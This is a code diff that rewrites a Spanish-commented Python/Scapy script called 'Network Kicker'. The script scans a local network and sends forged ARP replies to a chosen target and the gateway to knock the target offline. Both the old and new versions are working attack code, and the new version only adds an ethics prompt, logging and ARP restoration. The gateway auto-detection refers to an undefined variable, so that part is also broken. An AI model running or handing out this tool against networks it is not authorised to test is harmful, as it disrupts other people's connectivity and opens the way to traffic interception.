@@ -1,165 +1,203 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+"""
+Network Kicker - Enhanced ARP Spoofing Tool (Educational Use Only)
 
-from scapy.all import *
-import time
-import argparse
+This tool demonstrates ARP spoofing to temporarily disconnect a target
+from the local network. It includes safety features like automatic
+ARP table restoration and input validation.
+"""
+
+import os
 import sys
+import argparse
+import logging
+import signal
+import time
+from scapy.all import ARP, send, srp, Ether, get_if_addr, conf
 import ipaddress
 
-def get_mac(ip_address):
-    """
-    Obtiene la dirección MAC de una IP en la red local usando un paquete ARP.
-    """
-    try:
-        arp_request = ARP(pdst=ip_address)
-        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-        arp_request_broadcast = broadcast / arp_request
-        answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-        return answered_list[0][1].hwsrc
-    except IndexError:
-        return None
+# Setup logging
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    handlers=[
+        logging.FileHandler("network_kicker.log"),
+        logging.StreamHandler(sys.stdout)
+    ]
+)
+logger = logging.getLogger(__name__)
 
-def get_default_gateway_ip():
-    """
-    Intenta obtener la IP del gateway (router) de forma automática.
-    """
+# Global flag for graceful shutdown
+running = True
+
+def signal_handler(sig, frame):
+    global running
+    logger.info(" Interrupción recibida. Restaurando tablas ARP...")
+    running = False
+
+def is_root():
+    return os.geteuid() == 0
+
+def validate_ip(ip_str):
     try:
-        # Scapy puede obtener la ruta por defecto
-        gateway_ip = conf.route.route("0.0.0.0")[2]
+        ipaddress.ip_address(ip_str)
+        return True
+    except ValueError:
+        return False
+
+def get_default_gateway():
+    """Intenta descubrir la IP del gateway usando la interfaz activa."""
+    try:
+        from scapy.arch import get_if_addr
+        from scapy.layers.l2 import arping
+        # Obtiene la IP de la interfaz principal
+        local_ip = get_if_addr(conf.iface)
+        if not local_ip:
+            return None
+        # Calcula la red local
+        net = ipaddress.IPv4Network(f"{local_at}/24", strict=False)
+        gateway_ip = str(net.network_address + 1)
         return gateway_ip
-    except Exception:
-        return None
-
-def scan_network(network_range):
-    """
-    Escanea un rango de red para encontrar hosts activos y sus MACs.
-    """
-    print(f"[*] Escaneando la red: {network_range}...")
-    active_hosts = []
-    
-    try:
-        # Crear una lista de IPs a partir del rango de red
-        ips_to_scan = ipaddress.ip_network(network_range, strict=False).hosts()
-        
-        # Enviar paquetes ARP a cada IP
-        arp_request = ARP(pdst=str(network_range))
-        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-        arp_request_broadcast = broadcast / arp_request
-        
-        # srp() envía y recibe paquetes a nivel 2
-        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
-        
-        # Procesar las respuestas
-        for element in answered_list:
-            ip = element[1].psrc
-            mac = element[1].hwsrc
-            active_hosts.append({'ip': ip, 'mac': mac})
-            
     except Exception as e:
-        print(f"[-] Ocurrió un error durante el escaneo: {e}")
+        logger.debug(f"No se pudo autodetectar gateway: {e}")
         return None
-        
-    return active_hosts
 
-def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
-    """
-    Restaura la tabla ARP de los dispositivos a su estado original.
-    """
-    print("[+] Restaurando la tabla ARP...")
-    packet_to_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
-    packet_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
-    send(packet_to_target, count=5, verbose=False)
-    send(packet_to_gateway, count=5, verbose=False)
-    print("[+] Tabla ARP restaurada. Saliendo.")
+def scan_network(interface, timeout=2):
+    """Escanea la red local y muestra hosts activos."""
+    logger.info("Escaneando red... esto puede tardar unos segundos.")
+    try:
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), 
+                     timeout=timeout, iface=interface, verbose=False)
+        hosts = [(res[1].psrc, res[1].hwsrc) for res in ans]
+        logger.info("Dispositivos encontrados:")
+        for ip, mac in hosts:
+            logger.info(f"  {ip} - {mac}")
+        return hosts
+    except Exception as e:
+        logger.error(f"Error al escanear la red: {e}")
+        return []
+
+def get_mac(ip, interface, timeout=2):
+    """Obtiene la dirección MAC de una IP mediante ARP."""
+    try:
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
+                     timeout=timeout, iface=interface, verbose=False)
+        if ans:
+            return ans[0][1].hwsrc
+        else:
+            logger.error(f"No se pudo resolver la MAC para {ip}. ¿Está en la red?")
+            return None
+    except Exception as e:
+        logger.error(f"Error al obtener MAC de {ip}: {e}")
+        return None
+
+def spoof(target_ip, target_mac, spoof_ip, iface):
+    """Envía un paquete ARP spoofing."""
+    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    send(packet, iface=iface, verbose=False)
+
+def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac, iface, count=5):
+    """Restaura la tabla ARP enviando paquetes legítimos."""
+    logger.info("Restaurando tablas ARP...")
+    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), 
+         iface=iface, count=count, verbose=False)
+    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), 
+         iface=iface, count=count, verbose=False)
+    logger.info("Tablas ARP restauradas.")
 
 def main():
-    parser = argparse.ArgumentParser(description="Script para desconectar un dispositivo específico de la red local (ARP Spoofing).")
-    parser.add_argument("-t", "--target", help="Dirección IP del dispositivo a desconectar (víctima). Si no se especifica, se escaneará la red.")
-    parser.add_argument("-g", "--gateway", help="Dirección IP del gateway (router). Si no se especifica, se intentará detectar automáticamente.")
+    global running
+    parser = argparse.ArgumentParser(
+        description="Network Kicker - Herramienta educativa de ARP Spoofing",
+        epilog="USO ÉTICO: Solo en redes con permiso explícito."
+    )
+    parser.add_argument("--target", required=True, help="IP del dispositivo a desconectar")
+    parser.add_argument("--gateway", help="IP del gateway/router (autodetectado si no se especifica)")
+    parser.add_argument("--interface", default=conf.iface, help="Interfaz de red a usar (ej. eth0, wlan0)")
+    parser.add_argument("--scan", action="store_true", help="Escanear red antes de atacar")
+    parser.add_argument("--restore", action="store_true", help="Restaurar ARP tras la ejecución")
+    parser.add_argument("--count", type=int, default=10, help="Número de paquetes ARP a enviar (0 = continuo)")
+    parser.add_argument("--interval", type=float, default=1.0, help="Intervalo entre paquetes (segundos)")
+    parser.add_argument("--verbose", action="store_true", help="Modo detallado")
     
     args = parser.parse_args()
-    
-    target_ip = args.target
-    gateway_ip = args.gateway
 
-    # --- Detección Automática del Gateway ---
-    if not gateway_ip:
-        print("[*] No se especificó gateway. Intentando detectarlo automáticamente...")
-        gateway_ip = get_default_gateway_ip()
-        if not gateway_ip:
-            print("[-] Error: No se pudo detectar el gateway automáticamente. Por favor, especificalo con -g <IP_ROUTER>")
-            sys.exit(1)
-        print(f"[+] Gateway detectado automáticamente: {gateway_ip}")
+    if not args.verbose:
+        logger.setLevel(logging.WARNING)
 
-    # --- Selección del Objetivo (Manual o Automática) ---
-    target_mac = None
-    if not target_ip:
-        print("\n[*] No se especificó un objetivo. Iniciando escaneo de red para encontrar dispositivos...")
-        # Determinar el rango de red a partir del gateway (ej: 192.168.1.1 -> 192.168.1.0/24)
-        network_parts = gateway_ip.split('.')
-        network_range = f"{network_parts[0]}.{network_parts[1]}.{network_parts[2]}.0/24"
-        
-        hosts = scan_network(network_range)
-        
-        if not hosts:
-            print("[-] No se encontraron hosts activos en la red o el escaneo falló.")
-            sys.exit(1)
-            
-        print("\n[+] Dispositivos activos encontrados:")
-        for i, host in enumerate(hosts):
-            print(f"  {i+1}) IP: {host['ip']}\tMAC: {host['mac']}")
-            
-        while True:
-            try:
-                choice = int(input("\n[?] Elegí el número del dispositivo que querés atacar: ")) - 1
-                if 0 <= choice < len(hosts):
-                    target_ip = hosts[choice]['ip']
-                    target_mac = hosts[choice]['mac']
-                    print(f"\n[+] Objetivo seleccionado: {target_ip} ({target_mac})")
-                    break
-                else:
-                    print("[-] Opción inválida. Elegí un número de la lista.")
-            except ValueError:
-                print("[-] Entrada inválida. Por favor, ingresá un número.")
-    else:
-        # Si se especificó un objetivo, obtener su MAC
-        print(f"[*] Obteniendo la MAC del objetivo ({target_ip})...")
-        target_mac = get_mac(target_ip)
-        if target_mac is None:
-            print(f"[-] Error: No se pudo encontrar la MAC del objetivo en la IP {target_ip}. ¿Está en la red?")
-            sys.exit(1)
-        print(f"[+] MAC del objetivo encontrada: {target_mac}")
-
-    # --- Obtener MAC del Gateway ---
-    print(f"[*] Obteniendo la MAC del router ({gateway_ip})...")
-    gateway_mac = get_mac(gateway_ip)
-    if gateway_mac is None:
-        print(f"[-] Error: No se pudo encontrar la MAC del router en la IP {gateway_ip}. ¿Está en la red?")
+    # Verificación de root
+    if not is_root():
+        logger.error("Este script debe ejecutarse como root.")
         sys.exit(1)
-    print(f"[+] MAC del router encontrada: {gateway_mac}")
 
-    # --- Iniciar Ataque ---
-    print("\n[!] Iniciando el ataque ARP Spoofing. Presiona Ctrl+C para detener y restaurar la red.")
-    
-    try:
-        sent_packets_count = 0
-        while True:
-            arp_target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
-            arp_gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
-            
-            send(arp_target_packet, verbose=False)
-            send(arp_gateway_packet, verbose=False)
-            
-            sent_packets_count += 2
-            print(f"\r[*] Paquetes enviados: {sent_packets_count}", end="")
-            
-            time.sleep(1)
-            
-    except KeyboardInterrupt:
-        print("\n[+] Ataque detenido. Restaurando la conexión...")
-        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+    # Advertencia ética
+    print("\n⚠️  ADVERTENCIA ÉTICA Y LEGAL")
+    print("Este script es solo para uso educativo en redes que controlas o tienes permiso para probar.")
+    print("El uso no autorizado puede ser ilegal y causar daños reales.")
+    confirm = input("¿Confirmas que tienes permiso para usar esta herramienta? (sí/no): ").strip().lower()
+    if confirm not in ("sí", "si", "yes", "y"):
+        print("Operación cancelada por el usuario.")
         sys.exit(0)
+
+    # Validación de IP objetivo
+    if not validate_ip(args.target):
+        logger.error("IP objetivo inválida.")
+        sys.exit(1)
+
+    # Selección de gateway
+    gateway_ip = args.gateway
+    if not gateway_ip:
+        logger.info("Detectando gateway automáticamente...")
+        gateway_ip = get_default_gateway()
+        if not gateway_ip:
+            logger.error("No se pudo detectar el gateway. Especifícalo con --gateway.")
+            sys.exit(1)
+        logger.info(f"Gateway detectado: {gateway_ip}")
+
+    if not validate_ip(gateway_ip):
+        logger.error("IP del gateway inválida.")
+        sys.exit(1)
+
+    # Escaneo opcional
+    if args.scan:
+        scan_network(args.interface)
+
+    # Obtener MACs
+    logger.info("Obteniendo direcciones MAC...")
+    target_mac = get_mac(args.target, args.interface)
+    gateway_mac = get_mac(gateway_ip, args.interface)
+    
+    if not target_mac or not gateway_mac:
+        logger.error("No se pudieron obtener ambas direcciones MAC. Abortando.")
+        sys.exit(1)
+
+    logger.info(f"Objetivo: {args.target} ({target_mac})")
+    logger.info(f"Gateway: {gateway_ip} ({gateway_mac})")
+
+    # Configurar señal de interrupción
+    signal.signal(signal.SIGINT, signal_handler)
+
+    # Ejecutar ataque
+    logger.info("Iniciando ARP spoofing...")
+    sent_packets = 0
+    try:
+        while running:
+            spoof(args.target, target_mac, gateway_ip, args.interface)
+            spoof(gateway_ip, gateway_mac, args.target, args.interface)
+            sent_packets += 2
+            if args.count > 0 and sent_packets >= args.count * 2:
+                break
+            if args.count == 0 or args.count > 1:
+                time.sleep(args.interval)
+    except Exception as e:
+        logger.error(f"Error durante el spoofing: {e}")
+    finally:
+        if args.restore and running:
+            restore_arp(args.target, target_mac, gateway_ip, gateway_mac, args.interface)
+        elif not running:
+            restore_arp(args.target, target_mac, gateway_ip, gateway_mac, args.interface)
+        logger.info("Ejecución finalizada.")
 
 if __name__ == "__main__":
     main()
